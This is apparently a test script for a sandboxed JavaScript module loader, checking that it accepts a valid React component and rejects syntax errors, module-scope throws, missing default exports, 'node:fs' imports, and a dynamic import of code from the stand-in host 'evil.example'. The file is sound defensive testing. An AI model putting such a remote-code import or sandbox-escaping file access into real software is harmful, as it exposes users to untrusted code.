import { compileModule } from "../.loader-build/loader.mjs";
import React from "react";
import * as UI from "@radix-ui/themes";

// Mirrors REGISTRY in src/canvas/main.tsx.
const registry = {
  react: React,
  "@host": { host: { state: {}, log() {} } },
  "@ui": UI,
};
const cases = [
  ["healthy module", true, `
     import { useState } from "react";
     export default function App() { const [n] = useState(1); return <div>{n}</div>; }`],
  ["syntax error", false, `export default function App() { return <div>unclosed }`],
  ["throws at module scope", false, `
     const boom = (null).x;
     export default function App() { return <div/>; }`],
  ["no default export", false, `export function NotIt() { return null; }`],
  ["forbidden import", false, `
     import fs from "node:fs";
     export default function App() { return <div/>; }`],
  ["used forbidden import", false, `
     import fs from "node:fs";
     export default function App() { return <div>{fs.x}</div>; }`],
  ["dynamic import", false, `
     export default function App() { import("https://evil.example/x.js"); return <div/>; }`],
];

let pass = 0;
for (const [name, shouldLoad, src] of cases) {
  const r = compileModule(src, registry);
  const summary = r.ok ? "ok" : `${r.phase} — ${r.error.split("\n")[0].slice(0, 58)}`;
  const good = r.ok === shouldLoad;
  if (good) pass++;
  console.log(`${good ? "PASS" : "FAIL"}  ${name.padEnd(23)} ${summary}`);
}
console.log(`\n${pass}/${cases.length} behaved as expected`);
process.exit(pass === cases.length ? 0 : 1);
